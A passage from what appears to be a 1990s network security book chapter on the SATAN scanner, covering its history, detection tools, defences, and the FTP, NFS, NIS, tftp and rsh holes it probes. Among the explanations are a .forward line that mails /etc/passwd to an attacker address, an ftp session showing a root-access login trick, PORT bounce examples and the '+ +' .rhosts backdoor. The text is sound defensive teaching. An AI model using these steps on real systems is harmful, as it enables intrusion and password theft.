addresses for the site. The hacker uses a modem to call every single phone extension in an
organization until the hacker discovers all modems connected to phone lines. Two popular war
dialer programs are “ton loc” and “phone tag.” If the site permits dial-in access, this could lead
to an intrusion.
The hacker might try to get physical access to the network, with some sort of site tap. The
hacker might try to use people inside the organization, or former employees, to gain information
or access. A hacker could interview for a job in the organization, gain some free time
during the interview, walk up to a system on the site, and open a hole.
Summarize the Remote Network Attack
To summarize, the first phase of an attack is to get a login and password on the target systems.
This first phase consists of two parts, building up a list of security holes and a database of
information on the target. By matching the vulnerability with the opportunity, the hacker can
gain access.
Automate the Search
Doing a search by hand is tedious and slow, considering that automation is easy with a
computer system. One should seriously consider automating the search for network vulnerabilities.
SATAN can be used to automate this search.
468 Part II: Gaining Access and Securing the Gateway
The First Meeting with SATAN
“Soon will rise up what I expect;
and what you are trying to imagine now
soon must reveal itself before your eyes.”
—Dante Alighieri, Inferno, Canto XVI, lines 121–123
SATAN is an automated network vulnerability search and report tool that provides an
excellent framework for expansion. The authors indicate that SATAN stands for “Security
Analysis Tool for Auditing Networks.”
Although a form of the SATAN program can be run from the Unix command line, SATAN is
primarily intended to be run through a Web browser. Users indicate a target host or network,
along with proximity search levels and search depth, and initiate a search. SATAN gathers as
much information as possible about these targets and can search nearby hosts, as guided by the
proximity rules. (Proximity rules are fully explained later in this chapter. Basically, if a scan of
a target system reveals other host names, such as that target’s DNS server, SATAN will
consider those hosts to be on a proximity of “1” to the target. SATAN can be configured to
make scans of the target and all hosts that are a certain proximity level away from that target.)
It then adds search information into a standardized database that it uses for a variety of reports.
SATAN consists of a small PERL kernel, along with a number of C programs that do vulnerability
checks, and a large number of PERL support programs that control the searches, store
results to database files, generate reports, and emit HTML forms. Along with these
executables, a large number of pre-prepared HTML documents and tutorials are included.
History
The two authors of SATAN, Wietse Venema and Dan Farmer, have had a long history of
association with network security. According to the doc/design.html Web page in their
SATAN distribution, some of the design goals of SATAN were as follows:
n Investigate mapping of the security of large networks
n Use the traditional Unix toolbox approach of program design
n Make the product freely available
n Discover as much network information as possible without being destructive
n Create the best investigative security network tool
Although early versions of SATAN were already available in late 1993, the advent of Web
browsers in 1994 seemed to be the big turning point for the direction of the program. By early
SATAN and the Internet Inferno 469
1995, the program was already being beta-sited by many people. The creators choose April 5,
1995, Dan Farmer’s birthday, to release SATAN to the world.
The initial publicity over SATAN began in February, 1995, as the mass media took interest in
the program. This could have been due to the media’s continuing interest in network security,
the unique name of the program, or the flamboyance of one of the creators.
The New York Times wrote, “It discovers vulnerabilities for which we have no solutions.” The
Los Angeles Times warned, “SATAN is like a gun, and this is like handing a gun to a 12-yearold.”
TV stations (KTVU Channel 2 Oakland) showed five-minute reports on the topic,
including interviews with the creators. The San Francisco Chronicle had photos of Dan Farmer,
along with the story.
Vendors were flooded by requests for protection, and security bulletins were quickly released,
along with patches. The program was distributed by dozens of FTP sites to thousands of users.
Protection programs, which enabled users to see if they had been visited by SATAN, were
quickly announced and distributed.
Quite quickly, a security hole was found in SATAN, resulting in a revision and redistribution
of the program.
Despite claims that SATAN would result in massive criminal activity, the hopes and expectations
of the authors were realized. SATAN did not appear to greatly increase the number of
intrusions, but it did lead to a strengthening of network security by causing vendors to release
patches and users to inspect and tighten up their system security.
Unfortunately, few additional vulnerability searches have been added to SATAN since the
initial release, at least to the SATAN distributions available from the primary FTP archives.
Individual users have added such probes but are perhaps not forwarding these additions back
to the major distributions.
The Creators
Wietse Venema released SATAN while working for the Eindhoven University of Technology
in the Netherlands. He has written many useful security tools, such as tcp_wrappers, a secure
portmap program, a secure rpcbind program, logdaemon, which improves logging and
auditing, as well as SATAN. He also coauthored the influential paper “Improving the Security
of Your Site by Breaking Into It” with Dan Farmer (Farmer & Venema, 1993). A complete list
of his papers and tools is available via ftp://ftp.win.tue.nl/pub/security/index.html.
Dan Farmer, along with Gene Spafford at Purdue University, helped to create the COPS
security program. As a result of SATAN’s release, he was interviewed on TV and quoted in
quite a few newspapers and magazines. His home page says that his girlfriend, Muffy, chose
the name SATAN. His home page is at http://www.fish.com/dan.html.
470 Part II: Gaining Access and Securing the Gateway
Comparison to Other Tools
SATAN was not the first program to look for network vulnerabilities. ISS does a similar scan
and claims to look for more vulnerabilities than any other program—200 at the time of this
writing. Unlike SATAN, the latest ISS is not free, but is instead a commercial product that
does not include source code. See http://iss.com/ for more information. An older, but free,
version of ISS is available, along with a patch for bug fixes, from ftp://ftp.uunet.net/
usenet/comp.sources.misc/volume39/iss/.
Fremont, a freely available program, does a scan of hosts and attempts to build a map of
systems. However, it does not search for network vulnerabilities. It is available from ftp://
ftp.cs.colorado.edu/pub/cs/distribs/fremont.
Vendor Reactions
SATAN had the effect that the creators may have secretly desired. It increased customer
interest in network security, causing vendors to release bulletins and patches if they weren’t
already doing so. Such public disclosure of holes is risky, however; users who are unaware of
workarounds or patches may be vulnerable to holes for some time, whereas intruders have been
alerted to them.
The creators of SATAN provided advance copies of the programs to vendors to help them
prepare for its release. All the major vendors released extremely detailed bulletins in response to
SATAN, some before SATAN’s release and the rest within weeks after SATAN’s release. These
bulletins listed patches that addressed most of the vulnerabilities searched for by SATAN that
were code problems. The bulletins also indicated configuration recommendations and advice
on the trade-offs between running some products (finger) and the risk involved.
Note The CIAC Web site includes links to most vendor bulletins regarding SATAN. See
http://ciac.llnl.gov/ciac/.
Long-Term Impact
SATAN has increased public awareness of many Internet security vulnerabilities and improved
responsiveness by vendors, perhaps by alerting vendor management to the high-profile nature
of this area.
Surprisingly, few stories of intrusions as a result of SATAN have been publicized. It is possible
that these intrusions are just not being detected, because many attacks go unnoticed. For HP,
the SATAN advisory continues to be requested every week, making it the most popular
security bulletin ever published, with perhaps 10,000 copies distributed.
SATAN and the Internet Inferno 471
It is likely that SATAN will continue to gather additional vulnerability checks, although few
have been added so far. SATAN does provide a flexible architecture for adding such checks, an
easy way to intelligently scan many hosts, as well as a nice reporting mechanism and database
format.
Detecting SATAN
There are several network monitoring programs for your Unix system. The most popular
SATAN detection program is Courtney, but the others listed here are also quite useful.
Courtney
The Courtney program detects whether a system has been scanned by SATAN, or any other
port scanner such as ISS, and notifies the administrator of this probe. The program is a short
PERL script that uses the tcpdump packet sniffer library (libpcap) to monitor all network
traffic to a system. When the system encounters a SATAN-like rapid sequence of connection
attempts to many UDP and TCP ports, Courtney assumes that this has been generated by a
port scanner such as SATAN.
Courtney requires the tcpdump libpcap library, which uses the systems LAN in promiscuous
mode, something that not all systems support. Courtney was created by the CIAC in direct
response to SATAN’s release and is available via the CIAC Web site at http://ciac.llnl.gov.
Gabriel
Instead of a PERL script, Gabriel is a binary, built from C source, that offers similar functionality,
but without requiring the tcpdump libpcap library. Gabriel, however, runs only on Sun
platforms. It is freely available from http://www.lat.com/gabe.htm along with information on
joining a mailing list of Gabriel users.
TCP Wrappers
The TCP wrapper program can be used to log attempts to connect to network services.
Because SATAN’s UDP and TCP scans do exactly this, the TCP wrapper logs can indicate a
SATAN scan. In addition to the TCP_wrappers program, some inetd programs, and xinetd,
include TCP wrapper functionality.
In addition to logging attempts, these programs also provide some control over incoming
requests. tcp_wrappers can be used to permit (/etc/hosts.allow) or deny (/etc/hosts.deny)
access based on the remote IP address and the owner of the remote connection. Both of these
restrictions can be circumvented: IP spoofing is possible, and modification of the remote
system’s identd is straightforward. Many inetd programs use inetd.sec to provide the same
control.
472 Part II: Gaining Access and Securing the Gateway
Xinetd provides this functionality and adds control over the time of the connection attempt.
Xinetd also adds additional logging information, including remote user ID, access times
(including exit time and exit status), and service-specific information. Xinetd also permits
access control over every UDP packet instead of just the initial one.
n The address for TCP_wrappers is ftp://ftp.win.tue.nl/pub/security.
n The address for Xinetd is ftp://ftp.ieunet.ie/pub/security/xinetd-2.14.tar.gz.
netlog/TAMU
The netlog program logs TCP and UDP traffic, using the promiscuous mode of the network
interface (either by the /dev/nit device or streams dlpi). Although intended for Sun systems,
netlog should be able to be ported to any system that offers similar functionality. netlog is a
product of Texas A&M University and is available from ftp://net.tamu.edu/pub/security/
TAMU.
Argus
CMU’s SEI group, closely associated with CERT, offers an IP network transaction management
and monitoring program called Argus. Argus is available from ftp://ftp.sei.cmu.edu/
pub/argus-1.5 along with libpcap and other required programs.
Using Secure Network Programs
You are now aware of the following:
n The details of the first phase of a network attack
n How SATAN is used to mount these attacks
n The resources available for dealing with network vulnerabilities
n The network monitoring tools that can detect attacks.
It might be worthwhile to investigate ways of improving the overall security of Unix networking.
Although minor changes to existing network services can minimize vulnerabilities, major
changes are frequently required to deal with inherent problems of the Internet.
Kerberos
Phase one network attacks attempt to gain unauthorized access from a remote system. SATAN
searches for phase one vulnerabilities that permit unauthorized access. One way of improving
SATAN and the Internet Inferno 473
authorization over a network is using Kerberos. By using Kerberos, a system is no longer
vulnerable to .rhosts attacks or password sniffers. SATAN is still useful against Kerberized
environments, however, by helping remote hackers to identify KDCs. If the hacker can
succeed in breaking into a KDC system, all the hosts that use that KDC will be vulnerable.
The primary problem with Internet security today is that the passwords of users go across the
network in the clear, and authentication is based solely on the IP address and password.
Therefore, a hacker can, by using packet sniffing, capture the password and then impersonate
the IP address, gaining access to a remote system.
MIT developed a system called Kerberos that uses the DES algorithm to encrypt network
connections and provide for authentication. Described in RFC 1510, the Kerberos environment
depends on the presence of a key server (KDC) that keeps a database of all the keys of
each client. Each network service is modified to use authentication based on tickets that are
handed out by the KDC in response to requests by network clients.
For example, each morning, a user logs in to a workstation by running a kinit program and
typing a password. This generates a request from the workstation to the KDC for a ticketgranting
ticket (TGT) that is good for the rest of the day. Now, when the user wants to telnet
to a remote system, the telnet client uses the TGT to request a ticket from the KDC to gain
access to the remote system. The ticket contains a session key that is then used by both the
telnet client and server to encrypt the connection.
A network packet sniffer is unable to hijack the connection or impersonate either the client or
the server. Kerberos uses the 56-bit DES algorithm to encrypt packets. This code cannot be
exported outside the U.S., but versions of it are widely available internationally. Although 56
bits sounds strong, it isn’t that strong, and brute force attacks can decrypt packets.
Although Kerberos solves the problem of connection hijack and impersonation, it adds
complexity to the administration of the environment. The system admin must now maintain
KDCs to support the network. If the KDCs go down or become unreachable, the users are
unable to use the network. If the KDCs are violated, the security of the entire network has
been destroyed. Finally, the maintenance of the Kerberos configuration files is somewhat
complex and frequently time-consuming. Some Kerberos implementations are unsecure on
multiuser systems. From a SATAN standpoint, one might want to identify remote hosts that
offer KDC servers and focus attacks on these systems. Imagine if the KDC ran NFS; the
hacker could use NFS-based attacks to gain access to that system, permitting the hacker to gain
access to all systems that trusted that KDC.
Kerberos is available to U.S. sites from MIT, but a free, precompiled version of the MIT code
is available from Cygnus Corporation at http://www.cygnus.com. Other vendors, such as
Cybersafe, offer commercial Kerberos implementations.
Note For detailed information on Kerberos, see Chapter 9.
474 Part II: Gaining Access and Securing the Gateway
Secure Shell (ssh)
SATAN searches for phase one vulnerabilities. Another way of dealing with such vulnerabilities
is the recently introduced Secure Shell, or ssh, program. A replacement for rlogin, remsh, and
rcp, ssh doesn’t require the overhead of Kerberos (users don’t have to kinit, and the system
administrators do not need to maintain KDCs) and offers higher levels of cryptographics
security. In addition, it can be used to improve X Windows security.
ssh protects against IP spoofing, IP source routing, DNS spoofing, corruption of data in a
connection, and X authentication attacks.
The latest version of the ssh FAQ is available from http://www.uni-karlsruhe.de/˜ig25/sshfaq/.
The program itself is available from ftp://ftp.cs.hut.fi/pub/ssh/.
SSL
Yet another way of dealing with phase one vulnerabilities, the vulnerabilities that SATAN is
designed to locate, is SSL. Introduced originally to provide security for Web browsers by
encrypting http connections, SSL, or the Secure Socket Library, has gained quite a following
over the past year as a vehicle to provide security for general Internet services. A draft RFC
describes version 3 of the protocol, enabling anyone to implement daemons, although licensing
for the public key technology is still required.
SSL uses public key technology to negotiate a session key and crypto algorithm between a
client and server. The public key is stored in an X.509 certificate that bears a digital signature
from a trusted third party, such as RSA Corporation.
SSL moves the details of encryption and authentication into the socket library calls, making
implementation of Internet programs much easier. The SSL calls directly parallel standard
socket library calls. Compared to making a Kerberos server, making an SSL server is vastly
simpler.
From a user standpoint, SSL no longer requires the active participation of a KDC, because the
digital signature takes place offline. So the network connection is a two-party transaction,
rather than a three-party transaction. Both the client and server can be authenticated, although
current Netscape client browsers are using only server authentication. The SSL protocol
negotiates a crypto algorithm at the beginning of a connection; DES, triple-DES, IDEA, RC4,
and RC2, along with md5 hashes, are advertised in common implementations. To meet U.S.
export restrictions, SSL implementations shipped out of the U.S. can advertise only RC4-40,
which uses 40-bit keys.
Two publicly available implementations of SSL libraries are popular: SSLref and SSLeay.
SSLref, a product of Netscape Corporation, is free for non-profit uses and can be licensed for
commercial purposes. It requires the RSAref library from RSA Corporation. SSLeay is a public
SATAN and the Internet Inferno 475
domain version of SSL that includes implementations of the RSA algorithms over which RSA
Corporation claims legal ownership in the U.S.
Multiple versions of telnet, FTP, http, Mosaic, and rdist have been implemented using SSL
and are available from the SSLeay archives. The addresses follow:
n SSLref Source: http://www.netscape.com
n SSLeay Source: http://www.psy.uq.oz.au/˜ftp/Crypto/
n RSA Source: http://www.rsa.com
n VeriSign: http://www.verisign.com
n SSL RFC Draft. ftp://ietf.cnri.reston.va.us/internet-drafts/draft-hickmannetscape-
ssl-01.txt
Firewalls
SATAN is primarily intended for remote scanning of systems connected to the Internet. The
vast majority of such systems are firewall systems, rather than just standard Unix workstations.
A firewall system is one that connects an internal network to the Internet. Every organization
should connect to the Web only through carefully maintained firewall systems. By reducing
the number of systems directly on the Internet to a limited number that are under the scrutiny
of administrators, the level of vulnerability can be minimized. Each of these firewalls should
prevent vulnerable services, such as NFS, NIS, or fingerd, from being offered to Internet sites.
The DNS configuration on the firewall system should minimize the amount of information
available to external users. In general, firewalls should minimize the amount of “information
leakage” from the internal network to external sites.
Modifying a company network to use firewalls is a complex task that requires time and
consideration. TIS offers a public domain firewall that includes S/Key support. CERT has a
paper on packet filtering that can assist you in configuring a firewall. You can subscribe to a
firewalls mailing list by sending subscribe firewalls to majordomo@greatcircle.com. The
bibliography lists several references on the topic. Other papers on the topic are available via
the COAST and CERT archives.
One impact on users of implementing a firewall is access to the external Internet. Some
firewalls permit telnet or FTP connections to cross the firewall by requiring an additional
password for the firewall; some use S/Key; and some use SecurID smart cards. Other firewalls
use socks proxy servers that require the client services to be modified.
The importance of properly configuring a firewall, applying patches in a timely manner, and
limiting the amount of services available to Internet users cannot be overestimated. If SATAN
is used by a hacker against your organization, SATAN will be used to scan the firewall systems.
476 Part II: Gaining Access and Securing the Gateway
The addresses follow:
n TIS firewall: ftp://ftp.tis.com/pub/firewalls/toolkit
n CERT packet filtering paper: ftp://ftp.cert.org/pub/tech_tips/
packet_filtering
n S/Key source: ftp://thumper.bellcore.com/pub/nmh/skey
Note For more information on firewalls, see Chapter 7.
socks
socks is an IP encapsulation technique that permits TCP connections to use a proxy server to
complete a connection. It permits users to conveniently use Internet services across a gateway
without being aware that a gateway is being crossed. socksd is frequently used to turn a Unix
workstation that has a Internet connection as well as an internal company network connection
into a firewall system. As a result, SATAN’s scan of target firewall systems will frequently
indicate the presence of a socksd. While no vulnerabilities are currently known to exist in
socksd, if properly configured, SATAN’s discovery of socksd can indicate that the system is not
just a host connected to the Internet, but a firewall.
Normally, a telnet from host A to host B does a connect() directly between the two IP addresses
using the standard transport routing tables. When telnet is socksified, telnet first checks
whether the destination host B address is directly accessible. If it is, it follows that standard
connection process. If it is not, it references two environment variables, SOCKS_NS and
SOCKS_SERVER, to help it first resolve the domain name into an IP address, and then to
identify the IP address of the server running the socksd proxy server. It then encapsulates the
TCP packets according to the socks protocol and sends them to the socks server, which runs
on a gateway system and has direct connectivity to the destination system. The socks server
opens up a connection and begins to act as an intermediate hop in the connection.
If your firewall configuration supports a socks server, you must have socksified clients to take
advantage of this service. (An HP-UX–specific socks includes a socksify program that enables
you to convert binary versions of network programs.)
The addresses follow:
n socks: ftp://ftp.nec.com/pub/security/socks.cstc
n socks home page: http://www.socks.nec.com
n HP-UX socks: ftp://ftp.cup.hp.com/dist/socks
SATAN and the Internet Inferno 477
Investigating What SATAN Does
“Now we must turn aside
a little from our path, in the direction
of the malignant beast that lies in wait.”
—Dante Alighieri, Inferno, Canto XVII, lines 27–29
This section describes the exact details of the network holes uncovered by SATAN, as well as
holes that are common.
SATAN’s Information Gathering
SATAN scans the target system for active listeners on various UDP and TCP ports. The
number of ports scanned depends on the type of scanned specified: light, normal, or heavy.
Light Scans
The light scan does not do a generic UDP or TCP scan; it starts with the following three scans:
dns, rpc portmap, and if the portmapper shows mountd services, a showmount scan.
The dns scan uses nslookup to gather as much information as possible about the target host,
including MX records and authoritative name servers for that host.
The rpc scan asks the target portmap for a list of services. It then scans this list, looking for the
following services: rexd, arm, bootparam, ypserv, ypbind, selection_svc, nfs, mountd, rusersd,
netinfobind, and admind.
If mountd is present, SATAN runs a showmount scan. The showmount scan first asks the target
mountd to list what file systems are exported and what hosts are permitted to mount them (via
the showmount -e command). The scan then asks the target mountd to list what hosts actually
mount file systems, and to list those mounted file systems (via the showmount -a command).
Normal Scans
The normal scan does everything included in the light scan and adds scans of fingerd, various
TCP services, and UDP services. Depending on the results, and the rules database, it optionally
scans rusers, bootparam, and yp.
If the target is m2.notreal.com, the finger scan tries to finger -l the following:
@m2.notreal.com, 0@m2.notreal.com, @@m2.notreal.com, root@m2.notreal.com,
demo@m2.notreal.com, and guest@m2.notreal.com.
Next, SATAN does a TCP scan to see whether services are actively listening on ports for
gopher, http, FTP, telnet, smtp, nntp, uucp, and X. SATAN then scans UDP ports for dns
and xdmcp.
478 Part II: Gaining Access and Securing the Gateway
If the portmap program reports that rusersd is available, SATAN then contacts rusersd and
reports what users are logged in to the target and from what systems.
SATAN now tries to contact the rpc bootparam service to get the NIS domain name. It uses a
list of client names based on hosts that show up in the NFS exports list from mountd.
If SATAN gets the domain name, it then runs a yp-chk program to try to get the
passwd.byname map from the NIS server.
Heavy Scans
The heavy scan includes everything from the light and normal scans and adds a much larger
search for active services. The TCP scan runs from port 1 to port 9999. (A comment in
satan.cf indicates that a very heavy scan might want to run to 65535 instead of 9999.) The
UDP scan runs from 1 to 2050 and from 32767 to 33500.
Finally, a heavy scan checks the remaining rules to see if any of the .satan scripts need to be
run, based on the results of the previous port scans. For example, the ftp and rsh scripts are
executed if these services are available.
Vulnerabilities that SATAN Investigates
SATAN includes checks for a number of common security vulnerabilities.
ftpd
SATAN checks to see whether the remote host offers anonymous FTP access. If it does, it
checks to see if the ˜ftp directory is writeable by the anonymous user. SATAN checks the
banner line of the ftpd prompt to see if it is an old version of wu-ftpd.
The SATAN documentation explains how these checks correlate to known vulnerabilities. The
documentation also gives an example of another security hole in ftpd—the possibility of a
delayed PASS statement—but it does not actively look for this hole. The documentation also
mentions that the ˜ftp/etc/passwd file is a useful item, but SATAN does not attempt to retrieve
this.
Let’s investigate each of these ftpd issues. First, the presence of anonymous FTP is not a
security hole in itself. It does provide you with access to the remote system, which can enable
you to probe for other holes.
A hacker with access to the ˜ftp directory can upload an .rhosts file, perhaps containing + +, to
permit access from any remote system. The hacker can then rlogin to the system using the FTP
login account and gain access without typing a password. This can be prevented by indicating
a shell of /bin/false in the /etc/passwd entry for FTP.
SATAN and the Internet Inferno 479
A hacker could upload a .forward file containing a command, such as |/bin/mail
hacker@intruder.com < /etc/passwd, into the ˜ftp directory. The hacker would just mail a
message to FTP at the target site, causing the mail to be forwarded, as instructed, to the
program that gets executed. The hacker can then use Crack to attack the passwords on the
system.
SATAN does not look for writeable ˜ftp/etc or ˜ftp/bin directories, although it probably
should. A system using ftpd with sublogins depends on ˜ftp/etc/passwd for permitting access to
users. If an anonymous user can modify this file, that user can gain access to subdirectories
containing files from other users. Similarly, modification to utilities such as bin/ls or bin/sh
can offer the intruder opportunity for attacks.
For example, imagine if the /bin/ls command were modified to fake a reason for a new
password prompt. Some unsuspecting users might retype their password to this bogus prompt,
and the modified /bin/ls could store this information. Because many ˜ftp/etc/passwd files have
the same information as the /etc/passwd, this could give the hacker a real login.
The wu-ftpd program had two vulnerabilities, CERT CA-93:06 and CA-94:07, that permitted
remote users to gain access to the system. First, a race condition in the code permitted users to
log in as root. Second, the SITE EXEC command permitted users to execute commands as
root. Both of these problems have been fixed in recent versions of wu-ftpd.
The presence of an ˜ftp/etc/passwd file with encrypted fields is another potential security hole.
As mentioned earlier, the ˜ftp/etc/passwd file is mainly used to map file uids to login names for
directory listings, a service in which encrypted fields are not needed and can be commented
out by replacing them with an *. For those ftpds that use sublogins, the encrypted fields are
used for authentication.
However, these fields do not have to correspond to the /etc/passwd fields. Users should be
required to have different passwords for anonymous sublogins and normal system logins. This
is because a hacker will immediately run Crack against the ˜ftp/etc/passwd file entries. SATAN
does not get the ˜ftp/etc/passwd file.
The previously mentioned ftpd server bounce problem is also not probed by SATAN. This
problem could be checked by trying a PORT command with an IP address different than the
originating source, or with a privileged TCP port number on the originating source. For
example, if the hacker used FTP on a system with IP address 1.2.3.4, the hacker would specify
PORT 1,2,3,4,0,25 to spoof e-mail onto his or her own system, or PORT 2,3,4,5,0,21 to
spoof the IP address to the FTP port of the system at IP address 2.3.4.5. A fixed ftpd would
not permit either action.
The delayed PASS command problem is documented in the SATAN white paper but is not
investigated by SATAN because it represents a more active intrusion instead of a passive probe.
As mentioned in the white paper, a remote user could gain root access by embedding a CWD /
command between the USER and PASS commands. For example, consider this exchange:
480 Part II: Gaining Access and Securing the Gateway
% ftp
ftp> open notreal.com
Connected to notreal.com
220 notreal.com FTP server ready.
ftp> quote user ftp
331 Guest login ok, send ident as password
ftp> quote cwd ˜root
530 Please login with USER and PASS
ftp> quote pass ftp
230 Guest login ok, access restrictions apply.
At this point, the ftpd has chrooted to the / directory rather than the ˜ftp directory and has
suid to root. SATAN specifically avoided testing this because it involved an active intrusion,
which is a conflict with the design goal of SATAN’s third level. An unimplemented fourth
level of SATAN scanning, “All Out,” would probably be the right place for such a scan.
Most ftpds can be configured to prevent the login of users listed in a file called ftpusers. From
a SATAN standpoint, this does not matter as long as anonymous FTP is enabled. The wu-ftpd
program uses a configuration file called ftpaccess that can permit a wide range of control over
what anonymous users are allowed to do. Wu-ftpd also features another configuration file
called ftphosts that can be used to specify hosts that are not permitted to use FTP.
Unprivileged NFS Access
Unix supports the concept of privileged ports: only programs that run as root are permitted to
send packets from TCP or UDP ports in the range of 1–1024. The assumption behind this
concept is that only trustworthy people are able to get root privileges on any system connected to
the Internet. This is an extremely naive concept, because a hacker certainly has root access to his
or her own system, and the Internet is not so tightly governed that hackers are not able to gain
access. To add to this poor assumption, PCs do not typically support the concept of privileges,
and they are connected to the Internet. This means that anyone on a PC can run a program that
uses a privileged port.
Regardless of the naive assumption behind privileged ports, many network servers can and
do require that clients originate requests from privileged ports. For example, rlogind and
remshd (rshd) require client requests to come from privileged ports. The NFS and mountd
services can be configured to require client requests to originate from privileged ports.
NFS is a stateless protocol that permits a remote user to mount a file system and then treat that
file system as if it were local. The mount of a remote NFS file system causes the local system to
generate an rpc procedure call to the mountd program on the remote system. The rpc call asks
the mountd for a file handle. The mountd sends the file handle if the request originated from a
system listed in the export file list. The mountd determines this by doing a gethostbyaddr() call
to resolve the IP address into a domain name. Once the mountd approves and sends the client
a file handle for the file system, the client can now request any file operation on that file system
by just providing the file handle as authentication, along with any desired uid and gid (they
must be valid on the remote system). This is called AUTH_UNIX authentication.
SATAN and the Internet Inferno 481
Each file system operation done by the client user gets translated into one of 17 rpc requests
to the remote NFS server. These rpc calls are directed to the nfsd that services the nfs file
operations via a kernel call.
The privileged port check for the mountd (rpc.mountd) is done in the user space daemon
itself. The mountd must have been compiled to support this feature. For the standard portmap
program, this check is usually done only if a variable called nfs_portmon has been defined.
The privileged port check for the nfs request is not done in the nfsd program, but rather inside
the Unix kernel. This means that the nfs_portmon variable can usually be dynamically turned
on and off using a debugger such as adb. It is most useful to have both mountd and nfs check
for privileged port access. But remember that this is really not a vast increase in the security of
the system.
SATAN tests unprivileged access to both the mountd service and nfs service by generating
non-root rpc calls to both. SATAN also generates root rpc calls to both. It asks the mountd for
a list of exported file systems, and it asks nfs to do an ls -l type listing of each file system.
Unrestricted NFS Exports
Running showmount -e <remote system> prints a list of exported file systems. This list specifies
which hosts are permitted to mount the file systems. (It corresponds to the remote system’s /
etc/exports file.) The hosts can be specified explicitly by name, by netgroups, or by the wild
card everyone.
If everyone is permitted to mount the file system, the only authentication done on file access is
done on the client. The NFS server believes that the client NFS call has valid uid and gid
values. So, if the / file system is exported with read/write permissions and with root access, any
host on the network can mount the file system and act as root.
If no root access is permitted, any client can mount the file system and act as any user. The
quick way to do this is to su to the correct uid on the remote system, by creating the correct
account on that system and then doing the file operation. The quicker way to do this is to use
one of the many NFS hacking utilities to change the uid and gid and then call the NFS call
directly. Some of the better utilities include nfsbug (by Leendert van Dort), nfsmenu (by
Bastian Baker), and nfsshell. The FTP locations of these utilities can be found by doing an
Archie search.
A bug in older versions of NFS limited the size of netgroups to 256 bytes, creating a hole that
would effectively cause the export to default to everyone. The SATAN scan could see this or
the everyone export as unrestricted NFS access and report it as a vulnerability.
A hacker who finds this hole has access to the file system to the level specified by NFS. If root
access is exported, the hacker has complete control. If non-root read/write access is exported,
the hacker has access to all non-root files. A simple .rhosts file in any user’s home directory
offers the hacker login access. If the hacker has only read access, damage is still likely. The
482 Part II: Gaining Access and Securing the Gateway
hacker can get passwd files, NIS domain names, system files, NIS maps, and configuration
information; this information can quickly permit a hacker to discover vulnerabilities that will
lead to a login.
Another bug in older versions of NFS permitted remote users with a uid of 2^16 to masquerade
as root. The NFS check for uid permissions occurred on the 32-bit value passed in the
NFS rpc call, which was non-zero, and the system masked this to 16 bits for normal file
operations.
The use of netgroups has been the source of many security vulnerabilities. The NIS netgroups
file treats empty host fields as wild cards, permitting any host to gain access from the mountd.
Avoid exporting NFS files systems with write permission, especially when root permission is
granted. Explicitly list client hosts and netgroups instead of permitting any host to gain access.
Carefully review the netgroup’s man page to ensure the correct format for entries.
NIS Passwd Files
Many NIS servers do not have access control. Any client that is able to provide a domain name
can bind to the server. Once bound, the client system can request any of the NIS maps, including
the passwd map, hosts map, and aliases map. The only protection for these maps is the secrecy
of the domain name. Because domain names are usually descriptive and simple, they can
frequently be guessed. However, if the remote system runs a bootparam service from the portmap
program, an rpc call to this service returns the domain name.
SATAN interrogates the bootparam services, gets the domain name, and gets the passwd map.
After an intruder has this map, a Crack program can attempt to guess the passwords.
NIS servers should not be accessible to users on the other side of the firewall—the average
Internet user. They should always be used behind (and not on) firewalls that filter out traffic
on port 111 (portmap).
Portmap Forwarding
A feature of some portmapper daemons is the capability to forward an rpc call to the mountd
program. Because mountd authenticates the client rpc call based on the source IP address, a
request originating from the portmap program would appear to originate from the local
system. A remote user on an unauthorized client host could use this forwarding feature to
bypass IP access restrictions in the exports file. As long as the local system was permitted to
gain access to itself, the mountd would reply with the file handle for the NFS mount. Once
the hacker obtained the file handle, the subsequent NFS rpc calls would be approved because
no further IP authentication is done by the nfsd or nfs routines in the kernel.
A new portmap program (and rpcbind) prevents such forwarding, and this fix has been
adopted by most vendors. Get the new version of portmap to ensure that your system is not
vulnerable to this attack.
SATAN and the Internet Inferno 483
Note More details on this vulnerability are available from CERT bulletin CA-94:15, NFS
Vulnerabilities. A fixed version of portmap and rpcbind is referenced in this
document.
SATAN attempts to get the portmap program to forward a request to the mountd to mount
the exported file systems. This and all the other NFS checks done by SATAN are generated in
the nfs-chk/nfs-chk.c program. The code is well commented and demonstrates how this attack
could be exploited by a hacker.
tftp File Access
Many tftpd implementations do no authentication on incoming requests. Because inetd (with
inetd.sec, tcp-wrapper, or xinetd) can do authentication, tftpd should be started only from
inetd and should exit after servicing one request. tftpd should be restricted to dealing with a
limited directory subtree containing only necessary files.
A hacker with access to a tftpd that permits access to / can enter a new /etc/passwd, because
tftpd has no authentication and is frequently run as root out of inetd. A hacker with access
only to the tftp directory can still enter a corrupted version of configuration or boot files. Note
that tftpd does not usually provide a listing facility to show what files exist in the directory.
Although this improves security by not offering hackers a list of files to attack, it is not enough.
Based on knowledge about the OS, the names of boot files and configuration files are typically
quite similar. The hacker can sequence through guesses based on the OS and usually find a
correct filename.
Remote Shell Access
rshd (remshd) and rlogind are services that permit access based on trust. Trust is determined by
a match between the hostname and login name sent by the remote system in the initial packet,
and the presence of that hostname and login name, or wild cards, in the local .rhosts or
hosts.equiv file.
One analogy to this situation, which might illustrate the weaknesses, is if you are a bank
manager and you tell your tellers to trust anyone named Bob calling from Cleveland.
The presence of wild cards make this situation even more dangerous. The typical entry in
.rhosts or hosts.equiv is a hostname followed by a username, such as systemA userB. The
wildcard entry systemA + permits any user from systemA to gain access. The wild card
entry + + permits any user from any machine to gain entry.
The analogy to this situation is that you tell your tellers to trust anyone who claims to be
calling from Cleveland, or anyone who calls at all.
The presence of + + in the /.rhosts file is almost always an indicator that a hacker has gained
access to your system. This addition to /.rhosts is the primary goal of most attack scripts.
484 Part II: Gaining Access and Securing the Gateway
The first improvement to rshd (remshd) and rlogind to deal with improving trust-based
security was the reverse name lookup using the DNS resolver. The IP address of the source of
the TCP connection is used to do a gethostbyaddr() call that returns the fully qualified domain
name of the host that owns that IP address. If the hostname matches the hostname sent by the
initial protocol, access is permitted.
This is comparable to requiring each teller to call the Cleveland phone company and ask them
to trace the phone number of the incoming phone call, then looking up the owner of that
phone number. If the owner’s name matches the name claimed by the caller, access is approved.
This improvement does not solve the problem completely. If the resolver lookup for the
hostname contacts a caching name server, the name server could have cached a faked PTR
entry that points to the intruder’s name server. If the intruder has control over a legal name
server that is delegated authority over a network by the Internic, the intruder can easily modify
the name server database to facilitate this attack, without having to corrupt the cache of other
name servers (Bellovin, 1993; Schuba & Spafford, 1993).
Note The ftpd server bounce problem mentioned in an earlier section cannot be used to
